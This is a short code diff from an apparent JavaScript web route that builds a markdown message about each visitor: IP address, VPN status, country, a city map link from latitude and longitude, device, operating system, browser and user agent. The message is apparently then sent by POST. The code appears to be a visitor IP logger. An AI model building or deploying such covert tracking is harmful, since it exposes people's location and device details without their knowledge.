@@ -18,10 +18,10 @@ router.get("/", async (ctx) => {
   const cityInfo = `**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`
   const iptext = `**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`
   const vpn = `**VPN** : \`${info.proxy}\``
-  const device_v = encodeURIComponent(`**DEVICE** : ${device.type}`);
-  const device_os = encodeURIComponent(`**SYSTEM** : ${os.name}`);
-  const browser_v = encodeURIComponent(`**BROWSER** : ${browser.name}`);
-  const userAgentString_v = encodeURIComponent(`**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``);
+  const device_v = `**DEVICE** : ${device.type}`
+  const device_os = `**SYSTEM** : ${os.name}`
+  const browser_v = `**BROWSER** : ${browser.name}`
+  const userAgentString_v = `**userAgentString** : \`\`\`ts ${userAgentString}\`\`\``
   const text = `${iptext}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${vpn}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${countryinfo}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${cityInfo}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${browser_v}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${device_os}\n***-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-***\n${userAgentString_v}`
   const button = {
     method: 'POST',
